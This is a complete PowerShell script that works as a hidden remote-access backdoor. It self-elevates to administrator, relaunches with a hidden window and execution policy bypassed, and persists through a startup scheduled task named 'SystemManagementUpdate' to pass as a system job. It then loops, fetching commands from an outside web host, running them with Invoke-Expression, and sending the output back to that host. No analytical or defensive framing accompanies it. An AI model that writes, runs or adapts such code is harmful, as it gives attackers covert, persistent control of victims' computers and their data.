$cfHost = "https://connect.aniketpandey.website"
$logFile = Join-Path $PSScriptRoot "shell.txt"
$maxLogSizeMB = 5
$retryCount = 0
$maxRetries = 10
$cmdTimeout = 30  # seconds — kills commands that run longer than this

# --- Self-elevate to admin and relaunch hidden ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

# --- Persistence ---
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Force | Out-Null

# --- Logging ---
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    try {
        if (Test-Path $logFile) {
            $size = (Get-Item $logFile).Length / 1MB
            if ($size -ge $maxLogSizeMB) {
                Move-Item -Path $logFile -Destination "$logFile.old" -Force
            }
        }
        Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
    } catch {}
}

# --- Lightweight HTTP helpers ---
function Get-Command-From-Server {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $result = $wc.DownloadString("$cfHost/cmd")
        $wc.Dispose()
        return $result.Trim()
    } catch {
        throw $_
    }
}

function Send-Result-To-Server {
    param([string]$Body)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.Headers.Add("Content-Type", "text/plain")
        $wc.UploadString("$cfHost/result", $Body) | Out-Null
        $wc.Dispose()
    } catch {
        Write-Log "Failed to send result: $($_.Exception.Message)" "WARN"
    }
}

# --- Execute command with timeout ---
function Invoke-CommandWithTimeout {
    param([string]$Command, [int]$Timeout)

    $job = Start-Job -ScriptBlock {
        param($cmd)
        try {
            Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            "Error: " + $_.Exception.Message
        }
    } -ArgumentList $Command

    $finished = $job | Wait-Job -Timeout $Timeout

    if ($finished) {
        $output = Receive-Job $job
    } else {
        Stop-Job $job
        $output = "[!] Command timed out after ${Timeout}s. Partial output may be lost.`n"
        Write-Log "Command timed out: $Command" "WARN"
    }

    Remove-Job $job -Force
    return ($output | Out-String)
}

# --- Main loop ---
function Connect-Cloudflare {
    $idleDelay = 1
    $activeDelay = 0.3
    $currentDelay = $idleDelay
    $consecutiveIdle = 0

    Write-Log "Client started. PID=$PID. Connecting to $cfHost"

    while ($true) {
        try {
            $command = Get-Command-From-Server

            if ($command -and $command -ne "") {
                $retryCount = 0
                $consecutiveIdle = 0
                $currentDelay = $activeDelay

                Write-Log "CMD: $command"

                if ($command -eq "exit") {
                    Write-Log "Exit command received. Shutting down."
                    break
                }

                $result = Invoke-CommandWithTimeout -Command $command -Timeout $cmdTimeout

                Write-Log "OUT: $($result.Substring(0, [Math]::Min($result.Length, 200)))"

                $body = "PS " + (Get-Location).Path + "> " + $command + "`n" + $result + "`n"
                Send-Result-To-Server -Body $body
            }
            else {
                $consecutiveIdle++
                if ($consecutiveIdle -gt 10) {
                    $currentDelay = $idleDelay
                }
            }

            Start-Sleep -Milliseconds ($currentDelay * 1000)
        }
        catch {
            $retryCount++
            Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"

            $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
            Start-Sleep -Seconds $backoff

            if ($retryCount -ge $maxRetries) {
                Write-Log "Max retries ($maxRetries) hit. Resetting counter." "WARN"
                $retryCount = 0
            }
        }

        if (($consecutiveIdle % 100) -eq 0 -and $consecutiveIdle -gt 0) {
            [System.GC]::Collect()
        }
    }
}

Connect-Cloudflare